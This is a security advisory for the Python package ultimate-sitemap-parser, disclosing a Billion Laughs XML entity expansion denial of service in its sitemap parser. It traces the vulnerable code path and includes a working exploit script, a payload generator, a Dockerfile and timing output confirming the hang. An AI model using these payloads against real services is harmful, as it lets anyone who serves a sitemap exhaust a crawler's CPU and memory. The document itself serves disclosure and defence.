# [H] Ultimate Sitemap Parser (USP): XML Entity Expansion (Billion Laughs) DoS in XMLSitemapParser

## Summary
Severity: High
Advisory: GHSA-p5wc-9w9r-m232
CWE: CWE-776
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-p5wc-9w9r-m232
Type: github-advisory

## Affected
- PyPI: `ultimate-sitemap-parser` — affected >=0 <1.8.1

## Details
## XML Entity Expansion (Billion Laughs) DoS in XMLSitemapParser

### Summary

`ultimate-sitemap-parser` version 1.8.0 and earlier parse attacker-controlled XML content using Python's `xml.parsers.expat` without any restriction on DTD declarations or recursive entity references. An attacker who can serve a malicious sitemap can trigger exponential XML entity expansion (the "Billion Laughs" attack), causing unbounded CPU and memory consumption in the victim process. No authentication, user interaction, or special configuration is required — the vulnerability is exploitable by default through any public-facing use of `sitemap_tree_for_homepage()` or `sitemap_from_str()`.

### Details

The vulnerable code path begins at the public API entry points and flows to the Expat XML parser without any sanitization:

1. **`usp/tree.py:42`** — `sitemap_tree_for_homepage(homepage_url)` is the primary public entry point.
2. **`usp/tree.py:133`** — `sitemap_from_str(content)` is the secondary public entry point (also directly reachable from user code).
3. **`usp/fetch_parse.py:141-145`** — `SitemapFetcher._fetch()` retrieves the remote URL content.
4. **`usp/fetch_parse.py:175`** — The raw response becomes `response_content` (taint propagation point).
5. **`usp/fetch_parse.py:441-450`** — `XMLSitemapParser.sitemap()` creates an Expat parser and feeds the attacker-controlled content directly to it:

```python
# usp/fetch_parse.py:441-450  — VULNERABLE SINK
parser = xml.parsers.expat.ParserCreate(
    namespace_separator=self.__XML_NAMESPACE_SEPARATOR
)
# ... handler assignments ...
parser.Parse(self._content, is_final)   # <-- no DTD/entity restriction
```

A full audit of the `usp/` directory confirms that none of the following hardening measures are present:
- `defusedxml` usage
- DOCTYPE rejection
- `SetParamEntityParsing`
- `UseForeignDTD`
- `ExternalEntityRefHandler`

When a Billion Laughs payload is parsed, each nested entity reference is expanded recursively, multiplying the in-memory string by a factor of 10 per nesting level. At level 6 (10⁶ expansions), processing time exceeds 20 seconds, effectively hanging the calling process.

### PoC

**Environment setup:**

```bash
# Option A: install from PyPI
python -m venv /tmp/usp-poc
. /tmp/usp-poc/bin/activate
pip install ultimate-sitemap-parser==1.8.0
```

```bash
# Option B: Docker (using the provided Dockerfile)
docker build -t vuln-001-usp -f vuln-001/Dockerfile .
docker run --rm vuln-001-usp
```

**Attack payload and execution:**

```python
from usp.tree import sitemap_from_str
import time, signal

TIMEOUT = 20

class TimedOut(Exception): pass
def handler(s, f): raise TimedOut()

def build_payload(level):
    lines = ['<?xml version="1.0"?>', '<!DOCTYPE x [']
    lines.append(' <!ENTITY lol "lol">')
    for i in range(1, level + 1):
        prev = "lol" if i == 1 else f"lol{i-1}"
        expansion = "".join(f"&{prev};" for _ in range(10))
        lines.append(f' <!ENTITY lol{i} "{expansion}">')
    lines.append(']>')
    lines.append('<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">')
    lines.append(f'  <url><loc>http://example.com/&lol{level};</loc></url>')
    lines.append('</urlset>')
    return "\n".join(lines)

for level in [3, 4, 5, 6]:
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(TIMEOUT)
    t = time.perf_counter()
    try:
        result = sitemap_from_str(build_payload(level))
        elapsed = time.perf_counter() - t
        signal.alarm(0)
        pages = list(result.all_pages())
        url_len = len(pages[0].url) if pages else 0
        print(f"Level {level}: {elapsed:.4f}s  url_len={url_len:,}")
    except TimedOut:
        elapsed = time.perf_counter() - t
        signal.alarm(0)
        print(f"Level {level}: TIMEOUT after {elapsed:.1f}s -- DoS confirmed")
```

**Expected output (observed during dynamic reproduction):**

```
Level 3 (10^3):   0.0054s   url_len=3,019
Level 4 (10^4):   0.0321s   url_len=30,019
Level 5 (10^5):   5.2845s   url_len=300,019
Level 6 (10^6):  TIMEOUT after 20.0011s  -- DoS confirmed
```

Processing time grows exponentially: level 5 is ~165× slower than level 4, and level 6 exceeds the 20-second watchdog. This conclusively demonstrates unbounded resource consumption.

### Impact

This is a **Denial-of-Service (DoS)** vulnerability via XML Entity Expansion (the "Billion Laughs" / CWE-776 pattern). Any application or service that uses `ultimate-sitemap-parser` to crawl external or user-supplied URLs is impacted.

**Who is affected:**
- **Web crawlers and indexers** that call `sitemap_tree_for_homepage()` against arbitrary URLs — a single malicious sitemap server can lock up the crawler process.
- **CI/CD pipelines and monitoring tools** that periodically parse sitemaps as part of automated workflows.
- **Any application** that passes unvalidated user input to `sitemap_from_str()`.

Because no authentication, elevated privilege, or prior relationship is required (CVSS PR:N, UI:N), the attack surface is broad. An attacker only needs to operate a web server that returns a malicious sitemap when visited.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM python:3.11-slim

LABEL description="VULN-001: XML Entity Expansion (Billion Laughs) DoS PoC" \
      target="GateNLP/ultimate-sitemap-parser <= 1.8.0" \
      cwe="CWE-776"

WORKDIR /app

# Copy the cloned repository first
COPY repo/ /app/repo/

# Install uv_build (required build backend) then install the vulnerable package from the local clone
RUN pip install --no-cache-dir "uv_build>=0.9.6,<0.10.0" && \
    pip install --no-cache-dir /app/repo/

# Copy the PoC script
COPY vuln-001/poc.py /app/poc.py

CMD ["python3", "-u", "/app/poc.py"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-001: XML Entity Expansion (Billion Laughs) DoS
Affected: GateNLP/ultimate-sitemap-parser <= 1.8.0
CWE-776: Improper Restriction of Recursive Entity References in DTDs
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (7.5 High)

Sink: usp/fetch_parse.py:450
  parser = xml.parsers.expat.ParserCreate(namespace_separator=...)
  parser.Parse(self._content, is_final)   <- no DTD/entity restriction

Entry: usp.tree.sitemap_from_str(content: str) -> AbstractSitemap
"""

import signal
import sys
import time

from usp.tree import sitemap_from_str

TIMEOUT_SECONDS = 20
DOS_THRESHOLD_SECONDS = 2.0  # level 5 must exceed this to PASS


class TimedOut(Exception):
    pass


def _alarm_handler(signum, frame):
    raise TimedOut("SIGALRM fired")


def build_billion_laughs_payload(level: int) -> str:
    """Build a Billion Laughs XML payload nested to `level` depth.

    Each level multiplies expansion by 10:
      level 3 -> 10^3   = 1,000 chars
      level 4 -> 10^4   = 10,000 chars
      level 5 -> 10^5   = 100,000 chars
      level 6 -> 10^6   = 1,000,000 chars
    """
    lines = ['<?xml version="1.0"?>', "<!DOCTYPE x ["]
    lines.append(' <!ENTITY lol "lol">')
    for i in range(1, level + 1):
        prev = "lol" if i == 1 else f"lol{i - 1}"
        expansion = "".join(f"&{prev};" for _ in range(10))
        lines.append(f' <!ENTITY lol{i} "{expansion}">')
    lines.append("]>")
    lines.append('<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">')
    lines.append(f"  <url><loc>http://example.com/&lol{level};</loc></url>")
    lines.append("</urlset>")
    return "\n".join(lines)


def parse_with_timeout(payload: str):
    """Parse payload under SIGALRM watchdog; return (elapsed, url_len, timed_out)."""
    signal.signal(signal.SIGALRM, _alarm_handler)
    signal.alarm(TIMEOUT_SECONDS)
    start = time.perf_counter()
    timed_out = False
    url_len = 0
    try:
        result = sitemap_from_str(payload)
        elapsed = time.perf_counter() - start
        signal.alarm(0)
        pages = list(result.all_pages())
        if pages:
            url_len = len(pages[0].url)
    except TimedOut:
        elapsed = time.perf_counter() - start
        timed_out = True
        signal.alarm(0)
    except Exception as exc:
        elapsed = time.perf_counter() - start
        signal.alarm(0)
        print(f"    [EXCEPTION] {type(exc).__name__}: {exc}", flush=True)
    return elapsed, url_len, timed_out


def main() -> int:
    print("=" * 64)
    print("VULN-001  XML Entity Expansion DoS  (Billion Laughs)")
    print("Target : GateNLP/ultimate-sitemap-parser <= 1.8.0")
    print("Sink   : usp/fetch_parse.py:450  parser.Parse(_content)")
    print(f"Timeout: {TIMEOUT_SECONDS}s per level")
    print("=" * 64)

    results = {}
    for level in [3, 4, 5, 6]:
        theoretical = 10**level
        payload = build_billion_laughs_payload(level)
        print(
            f"\n[*] Level {level}: 10^{level} = {theoretical:>10,} chars  "
            f"payload_bytes={len(payload)}",
            flush=True,
        )
        elapsed, url_len, timed_out = parse_with_timeout(payload)
        results[level] = (elapsed, url_len, timed_out)

        if timed_out:
            print(
                f"[!] Level {level}: TIMED OUT after {elapsed:.1f}s  "
                f"(>{TIMEOUT_SECONDS}s)  -- DoS confirmed",
                flush=True,
            )
        else:
            print(
                f"[+] Level {level}: completed in {elapsed:.4f}s  "
                f"url_len={url_len:,}",
                flush=True,
            )

    print("\n" + "=" * 64)
    print("TIMING SUMMARY")
    print("=" * 64)
    for lvl, (elapsed, url_len, timed_out) in results.items():
        status = f"TIMEOUT >{TIMEOUT_SECONDS}s" if timed_out else f"{elapsed:.4f}s"
        print(f"  Level {lvl} (10^{lvl:>1}): {status:>20}   url_len={url_len:,}")

    print()

    # Verdict: level 5 must take >2s or level 6 must time out
    lvl5_elapsed, _, lvl5_timed_out = results.get(5, (0, 0, False))
    lvl6_elapsed, _, lvl6_timed_out = results.get(6, (0, 0, False))

    slow_evidence = lvl5_elapsed > DOS_THRESHOLD_SECONDS or lvl5_timed_out
    timeout_evidence = lvl6_timed_out or lvl6_elapsed > DOS_THRESHOLD_SECONDS

    if slow_evidence or timeout_evidence:
        print("[PASS] DoS CONFIRMED: exponential CPU exhaustion via XML entity expansion")
        print(
            f"       level-5 time={lvl5_elapsed:.4f}s  level-6 "
            + ("TIMEOUT" if lvl6_timed_out else f"time={lvl6_elapsed:.4f}s")
        )
        print("[PASS] CWE-776 Billion Laughs confirmed in ultimate-sitemap-parser <= 1.8.0")
        return 0
    else:
        print("[FAIL] Timing did not show significant slowdown -- DoS not confirmed")
        print(f"       level-5={lvl5_elapsed:.4f}s  level-6={lvl6_elapsed:.4f}s")
        print("       (expected level-5 > 2s or level-6 to time out)")
        return 1


if __name__ == "__main__":
    sys.exit(main())
```

## References
- https://github.com/GateNLP/ultimate-sitemap-parser/security/advisories/GHSA-p5wc-9w9r-m232
- https://github.com/GateNLP/ultimate-sitemap-parser
